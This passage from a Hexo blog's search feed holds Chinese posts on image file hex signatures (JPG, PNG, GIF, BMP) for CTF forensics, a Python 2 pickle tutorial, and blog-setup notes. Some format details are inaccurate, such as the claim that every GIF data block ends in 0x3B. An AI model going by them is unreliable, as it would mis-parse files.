    <content type="html"><![CDATA[<p><strong>总结一下常见的图片格式的十六进制的开头结尾以及含义（可用winhex十六进制编辑器打开图片编辑）</strong><br><img src="/images/4.jpg"></p><span id="more"></span><h2 id="1、JPG文件格式："><a href="#1、JPG文件格式：" class="headerlink" title="1、JPG文件格式："></a>1、JPG文件格式：</h2><p>（1）JPG &#x3D; “段” + 经过压缩编码的图像数据<br>什么是‘段’？段是一种数据结构，主要是来控制一段数据怎样存储和表示，段的结构如下：<br>段  &#x3D;  段标识  +  段类型  +  段长度  +段内容          （其中文件头和文件尾属于没有‘段长度’和‘段内容’的特殊的段）<br>（2）‘段标识’是一种固定的符号–“FF”，段的类型有30种，其中有10中是每个JPG图片中必须存在的，其余的都是可选的类型，在此，我们就那10中类型加以说明，如下：</p><p>【1】D8 —- 文件头   【2】D9 — 文件尾  【3】FE— 注释  【4】C0— 帧开始  【5】C1 — 帧开始<br>【6】C4 — 定义Huffman表  【7】DA — 扫描行开始  【8】DB — 定义量化表 【9】DD—定义重新开始间隔<br>【10】E0 — 定义交换格式和图像识别信息</p><p>因此，一般的JPG格式的图片通过十六进制的文件磁盘内容查看器发现：文件头为：FF D8  ，而且通常在此之后都有FF E0（其后一般接JFIF）来表明图像识别信息和交换格式，文件尾为：FF D9。</p><h2 id="2、PNG文件格式："><a href="#2、PNG文件格式：" class="headerlink" title="2、PNG文件格式："></a>2、PNG文件格式：</h2><p>（1）文件结构如下：<br>PNG文件 &#x3D;  PNG标识  +  数据块   + 数据块  + ……  + 数据块（其中数据块的个数最少是4）<br>（2）PNG标识是固定的，以十六进制表示为：【89  50  4E  47  0D  0A  1A  0A】，对应的符号为：【 ‰  P  N  G  .  .  .  . 】</p><p>数据块分析如下：</p><p>PNG文件 -  PNG标识  &#x3D;   IHDR  + 可选数据块  +  PLTE  +  可选数据块  +  IDAT  +  可选数据块  +  IEND<br>分别说明如下：</p><p>【1】IHDR数据块，文件头数据块，在一个PNG文件里只能有一个。<br>【2】PLTE数据块，调色板数据块，它仅与索引彩色图像有关，其中，‘索引图像’是指–一种把像素值直接作为RGB调色板下标的图像。<br>【3】IDAT数据块，图像数据块，存储实际的图像数据，在数据流中包含多个连续顺序的图像数据块。<br>【4】IEND数据块，图像结束数据块，表示–数据流已结束，放在文件的末尾。<br>以上的数据块都是以自己的名字作为开头来控制一段数据。其中，结尾数据块IEND的内容固定：<br>【00  00  00  00  49  45  4E  44  AE  42  60  82】，对应的符号如下：<br>【.   .    .    .   I   E   N   D  （后四位为CRC校验码）】</p><h2 id="3、GIF文件格式："><a href="#3、GIF文件格式：" class="headerlink" title="3、GIF文件格式："></a>3、GIF文件格式：</h2><p>（1）文件的单位是数据块，文件的结构如下：<br>GIF文件  &#x3D;  文件头  +  GIF数据流  +  文件结束块<br>GIF数据流  &#x3D;  控制块  +   成像块   +  特殊用途块<br>（2）文件头大小为6个字节，而且【文件头  &#x3D;  标识符（3字节） +  版本（3字节）】，其中，标识符为“GIF”，版本一般是“87a”或者“89a”。<br>文件结束块是一个单字节的数据块，它指示数据流的结束，值为“0x3B”，符号是“；”。<br>注意：GIF文件中的每个数据块都有一个块尾记录，大小为1个字节，同样也是“0x3B”。</p><h2 id="4、BMP文件格式："><a href="#4、BMP文件格式：" class="headerlink" title="4、BMP文件格式："></a>4、BMP文件格式：</h2><p>（1）文件结构如下：<br>BMP文件 &#x3D;  文件头信息块  +  图像描述信息块  +  颜色表  +  图像数据区<br>（2）关于文件头信息块，0000–000D，其中，【0000–0001】为2个字节的文件标识“BM”，【0002–0005】为4个字节的文件大小的值，【0006–0009】为4个字节的保留值，分别为【00 00 00 00】，【000A – 000D】为图像数据区的起始位置（偏移量），它的值等于前三个内容的大小的和。<br>另外，几个比较重要的位置有：【000A—000D】图像数据的起始位置，【0022–0025】图像数据的大小，【000E–0011】图像描述信息块大小，【0012–0015】图像宽度，【0016–0019】图像高度。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python对象以及将对象序列化</title>
    <link href="/blog/2018/07/30/Python-%E5%AF%B9%E8%B1%A1%E4%BB%A5%E5%8F%8A%E5%B0%86%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/blog/2018/07/30/Python-%E5%AF%B9%E8%B1%A1%E4%BB%A5%E5%8F%8A%E5%B0%86%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p><strong>今天开始继续学习一下python，熟悉一门脚本语言</strong><br><img src="/images/fengjing.jpg"></p><span id="more"></span><h2 id="Python对象类型"><a href="#Python对象类型" class="headerlink" title="Python对象类型"></a>Python对象类型</h2><p>  Python的内置的对象类型主要有数字、字符串、列表、元组、字典、集合等等。其实在Python中，一切皆为对象。</p><h2 id="pickle函数"><a href="#pickle函数" class="headerlink" title="pickle函数"></a>pickle函数</h2><h3 id="pickle腌制"><a href="#pickle腌制" class="headerlink" title="pickle腌制"></a>pickle腌制</h3><p><code>#dumps(object)将对象序列化</code><br><code>import pickle</code><br><code>lista=[&quot;mingyue&quot;,&quot;jishi&quot;,&quot;you&quot;]</code><br><code>listb=pickle.dumps(lista)</code><br><code>print listb</code></p><p><img src="/images/xuliehua.png"></p><p><code>#loads(string)将对象原样恢复，并且对象类型也恢复为原来的格式</code><br><code>listc=pickle.loads(listb)</code><br><code>print listc</code></p><p><img src="/images/fanxuliehua.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#dump(object,file),将对象存储到文件里面序列化</span><br>group1=(<span class="hljs-string">&quot;bajiu&quot;</span>,<span class="hljs-string">&quot;wen&quot;</span>,<span class="hljs-string">&quot;qingtian&quot;</span>)<br>f1=file(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>pickle.dump(group1,f1,<span class="hljs-literal">True</span>)<br>f1.close()<br></code></pre></td></tr></table></figure><p><code>#load(object,file)将dump()存储在文件里面的数据恢复</code><br><code>f2=file(&#39;1.txt&#39;,&#39;rb&#39;)</code><br><code>t=pickle.load(f2)</code><br><code>print t</code><br><code>f2.close()</code></p><h3 id="详解pickle"><a href="#详解pickle" class="headerlink" title="详解pickle"></a>详解pickle</h3><p>在Python中如果我们有一些对象需要持久性存储，并且不丢失我们这个对象的类型与数据，我们则需要将这些对象进行序列化，序列化之后，需要使用的时候，我们再恢复为原来的数据。序列化的这种过程，我们将其称为pickle。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>慢慢学吧，一口也吃不成大胖子，每天用时间去学习，一点点积累，慢慢进步，一步一步往上爬，坚持下去就好了~~~</p>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/blog/2018/07/28/hello-world/"/>
    <url>/blog/2018/07/28/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>My First Blog</title>
    <link href="/blog/2018/07/28/My-First-Blog/"/>
    <url>/blog/2018/07/28/My-First-Blog/</url>
    
    <content type="html"><![CDATA[<p><strong>今天正式建立了博客，写一下留个纪念</strong><br>  <img src="/images/3.jpg"></p><span id="more"></span><h2 id="博客的建立"><a href="#博客的建立" class="headerlink" title="博客的建立"></a><strong>博客的建立</strong></h2><p>  在室友的怂恿下，决定搭建一个个人博客，顺便学点东西。服务器懒得花钱买了，于是就使用了GitHub上面的网页托管服务，免费使用，学着用用GitHub也挺好的。说干就是干，下载组件，查找教程，花了几个小时弄好了本地，上传到GitHub就出了问题。然后各种百度解决问题，没成功，最后重新配置ssh，不设置密码居然就好了，太神奇了。。。<br><img src="/images/1.png"></p><h2 id="它的用处"><a href="#它的用处" class="headerlink" title="它的用处"></a><strong>它的用处</strong></h2><p> 嗯，它就用来作为学习笔记吧，方便自己查找。亦可用作和其他同学技术交流，欢迎大家指正我的错误，不胜感激！</p><h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a><strong>感谢</strong></h2><p> 谢谢访问，现在水平还挺低，界面也不是多好看，以后慢慢学习，一直学习就好了。加油~~<br><img src="/images/2.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
